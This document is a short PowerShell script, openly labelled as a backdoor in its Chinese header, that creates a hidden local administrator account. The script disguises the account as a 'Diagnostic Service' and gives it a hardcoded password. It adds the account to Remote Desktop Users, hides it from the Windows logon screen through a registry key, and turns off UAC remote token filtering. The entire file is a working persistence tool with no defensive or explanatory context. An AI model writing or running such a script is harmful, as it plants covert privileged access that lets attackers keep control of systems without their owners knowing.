# backdoor_user.ps1 —— 纯后门账号（最隐蔽，不动系统策略）
$U = 'svc_diag$'; $P = 'P@ssw0rd!2024'
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrators')) { Write-Host '[!] need admin'; exit 1 }
net user $U /delete 2>$null | Out-Null
net user $U $P /add /expires:never /comment:'Diagnostic Service' | Out-Null
net localgroup administrators $U /add | Out-Null
net localgroup 'Remote Desktop Users' $U /add | Out-Null
New-Item 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' -Force | Out-Null
Set-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' $U 0
Set-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' LocalAccountTokenFilterPolicy 1
Write-Host "[+] backdoor user: $U / $P (admin, hidden from logon screen, UAC remote off)"
